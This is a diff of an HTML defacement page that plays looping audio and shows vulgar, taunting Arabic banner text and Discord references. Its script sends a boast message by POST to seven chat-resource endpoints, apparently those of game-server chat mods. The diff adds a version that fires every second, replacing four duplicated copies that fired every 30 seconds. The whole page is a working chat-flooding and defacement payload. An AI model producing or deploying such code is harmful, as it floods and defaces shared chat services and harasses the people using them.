@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MY name discord: 9z71</title>
+    <title>discord.gg/uaee</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background: url('https://media.discordapp.net/attachments/1402964948895793152/1426652072828342272/192e469c-7f18-4248-b580-a406c7507b26.png?ex=68eca988&is=68eb5808&hm=3ba43357e78cfe005c67557b4861b31cd800daa5ea5e69c08859a530ea81832d&=&format=webp&quality=lossless') no-repeat center center fixed;
+            background: url('https://media.discordapp.net/attachments/1402964948895793152/1426661993040969799/d23da056-fdf1-49a9-a5b8-ba537dbc1e6e.png?ex=68ecb2c5&is=68eb6145&hm=29e0b4b53397f083e4577800ec503740503f0731d632a394e6ffb41d0a78bfc6&=&format=webp&quality=lossless') no-repeat center center fixed;
             background-size: cover;
             font-family: 'Courier New', Courier, monospace;
             color: #0000ff;
@@ -18,148 +18,55 @@
             height: 100vh;
             flex-direction: column;
             text-align: center;
-            overflow: hidden;
         }
-
-        .text {
-            font-size: 9em; /* Increase text size */
-            color: #000000;
-            text-shadow: 0px 0px 8px #000000, 0px 0px 15px #000000, 0px 0px 25px #000000;
-            letter-spacing: 4.5px;
-            animation: slideUpDown 5s ease-in-out infinite; /* Modify animation */
-        }
-
         .image-container img {
-            width: 100px;
+            width: 410px; 
             height: auto;
-            border: 4px solid #FF00D8;
+            border: 2px solid #0000ff; 
             border-radius: 15px;
-            box-shadow: 0 0 15px rgba(255, 0, 216, 0.7);
-            transition: transform 0.3s ease;
+            box-shadow: 0 0 15px rgba(0, 0, 255, 0.7); 
         }
-
-        .image-container img:hover {
-            transform: scale(1.1);
-        }
-
         .info {
-            margin-top: 150px;
-            font-size: 0.5em;
-            color: #FF00D8;
-            text-shadow: 0px 0px 8px #000000, 0px 0px 15px #000000, 0px 0px 25px #000000;
-            letter-spacing: 4.5px;
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: #0000ff; 
+            text-shadow: 0px 0px 8px #0000ff, 0px 0px 15px #0000ff, 0px 0px 25px #0000ff; 
+            letter-spacing: 4.5px; 
             white-space: pre-wrap;
         }
-
-        button {
-            background-color: #000000;
-            color: #fff;
-            border: none;
-            padding: 15px 30px;
-            font-size: 1.2em;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: background-color 0.3s;
+        .text {
             margin-top: 20px;
-        }
-
-        button:hover {
-            background-color: #FF4EC3;
-        }
-
-        @keyframes slideUpDown {
-            0% {
-                transform: translateY(-50px); /* Start from top */
-            }
-            50% {
-                transform: translateY(200px); /* Move down */
-            }
-            100% {
-                transform: translateY(-50px); /* Return to top */
-            }
+            font-size: 7em; 
+            color: #0000ff; 
+            text-shadow: 0px 0px 8px #0000ff, 0px 0px 15px #0000ff, 0px 0px 25px #0000ff; 
+            letter-spacing: 4.5px; 
         }
     </style>
 </head>
 <body>
+    <div class="image-container">
+        <img src="https://media.discordapp.net/attachments/1402964948895793152/1426652072828342272/192e469c-7f18-4248-b580-a406c7507b26.png?ex=68eca988&is=68eb5808&hm=3ba43357e78cfe005c67557b4861b31cd800daa5ea5e69c08859a530ea81832d&=&format=webp&quality=lossless" alt="Discord Image">
+    </div>
     <audio autoplay loop>
         <source src="https://cdn.discordapp.com/attachments/1425924169404518523/1427004546965704805/Desktop_2025.10.12_-_21.59.33.12.DVR.mp3?ex=68ed490c&is=68ebf78c&hm=dd6bb1e5c24db59af28fc00e9ffab4f3489024d1e5fd8e50c80c05d39f92d8d4&" type="audio/mpeg">
+        Your browser does not support the audio element.
     </audio>
+    <div class="text">المري&صلبوخ وصل</div>
+    <div class="text">الكل عل زبي</div>
 
-    <div class="text">صلبوخ وصل يا ساده</div>
-    <div class="text">صلبوخ داعس عليكم</div>
-
-    <div class="image-container">
-        <!-- Image container for future use -->
-    </div>
-
-    <div class="info" id="ip-info">
-        <!-- IP info will be fetched here -->
-    </div>
-
-    <!-- Message Sending Script -->
     <script>
-        const msg = `👑 صلبوخ داعس عليكم ! 👑`;
+        const msg = `👑 المري & صلبوخ 👑`;
         const body = JSON.stringify({ message: msg });
 
         setInterval(() => {
-            // Sending the message to various URLs
             fetch("https://flix-scripts/chatResult", { method: "POST", body });
-            fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST", body: JSON.stringify({"message": msg, "channel": "شات العام", "color": null, "isImageAndLinksAllowed": [false, false]})});
+            fetch("https://danger_chat/Danger_Chat:SendMessage", { method: "POST", body: JSON.stringify({ "message": msg, "channel": "شات العام", "color": null, "isImageAndLinksAllowed": [false, false] }) });
             fetch("https://easy-chat+/o6ZbK5Ecp6", { headers: { accept: "*/*", "content-type": "application/x-www-form-urlencoded; charset=UTF-8" }, body: JSON.stringify({ message: msg, channel: "شات العام" }), method: "POST" });
             fetch("https://melix_chat/chatResult", { method: "POST", body });
             fetch("https://as_chat/chatResult", { method: "POST", body });
             fetch("https://chat/chatResult", { method: "POST", body });
             fetch("https://ho-chatv2/Chat", { method: "POST", body: JSON.stringify({ "Type": "chatResult", "message": msg, "chatType": "general" }) });
-        }, 30000); // Send the message every 30 seconds
-        
-    </script>
-        <script>
-        const msg = `👑 صلبوخ داعس عليكم ! 👑`;
-        const body = JSON.stringify({ message: msg });
-
-        setInterval(() => {
-            // Sending the message to various URLs
-            fetch("https://flix-scripts/chatResult", { method: "POST", body });
-            fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST", body: JSON.stringify({"message": msg, "channel": "شات العام", "color": null, "isImageAndLinksAllowed": [false, false]})});
-            fetch("https://easy-chat+/o6ZbK5Ecp6", { headers: { accept: "*/*", "content-type": "application/x-www-form-urlencoded; charset=UTF-8" }, body: JSON.stringify({ message: msg, channel: "شات العام" }), method: "POST" });
-            fetch("https://melix_chat/chatResult", { method: "POST", body });
-            fetch("https://as_chat/chatResult", { method: "POST", body });
-            fetch("https://chat/chatResult", { method: "POST", body });
-            fetch("https://ho-chatv2/Chat", { method: "POST", body: JSON.stringify({ "Type": "chatResult", "message": msg, "chatType": "general" }) });
-        }, 30000); // Send the message every 30 seconds
-        
-    </script>
-        <script>
-        const msg = `👑 صلبوخ داعس عليكم ! 👑`;
-        const body = JSON.stringify({ message: msg });
-
-        setInterval(() => {
-            // Sending the message to various URLs
-            fetch("https://flix-scripts/chatResult", { method: "POST", body });
-            fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST", body: JSON.stringify({"message": msg, "channel": "شات العام", "color": null, "isImageAndLinksAllowed": [false, false]})});
-            fetch("https://easy-chat+/o6ZbK5Ecp6", { headers: { accept: "*/*", "content-type": "application/x-www-form-urlencoded; charset=UTF-8" }, body: JSON.stringify({ message: msg, channel: "شات العام" }), method: "POST" });
-            fetch("https://melix_chat/chatResult", { method: "POST", body });
-            fetch("https://as_chat/chatResult", { method: "POST", body });
-            fetch("https://chat/chatResult", { method: "POST", body });
-            fetch("https://ho-chatv2/Chat", { method: "POST", body: JSON.stringify({ "Type": "chatResult", "message": msg, "chatType": "general" }) });
-        }, 30000); // Send the message every 30 seconds
-        
-    </script>
-        <script>
-        const msg = `👑 صلبوخ داعس عليكم ! 👑`;
-        const body = JSON.stringify({ message: msg });
-
-        setInterval(() => {
-            // Sending the message to various URLs
-            fetch("https://flix-scripts/chatResult", { method: "POST", body });
-            fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST", body: JSON.stringify({"message": msg, "channel": "شات العام", "color": null, "isImageAndLinksAllowed": [false, false]})});
-            fetch("https://easy-chat+/o6ZbK5Ecp6", { headers: { accept: "*/*", "content-type": "application/x-www-form-urlencoded; charset=UTF-8" }, body: JSON.stringify({ message: msg, channel: "شات العام" }), method: "POST" });
-            fetch("https://melix_chat/chatResult", { method: "POST", body });
-            fetch("https://as_chat/chatResult", { method: "POST", body });
-            fetch("https://chat/chatResult", { method: "POST", body });
-            fetch("https://ho-chatv2/Chat", { method: "POST", body: JSON.stringify({ "Type": "chatResult", "message": msg, "chatType": "general" }) });
-        }, 30000); // Send the message every 30 seconds
-        
+        }, 1000);
     </script>
 </body>
 </html>
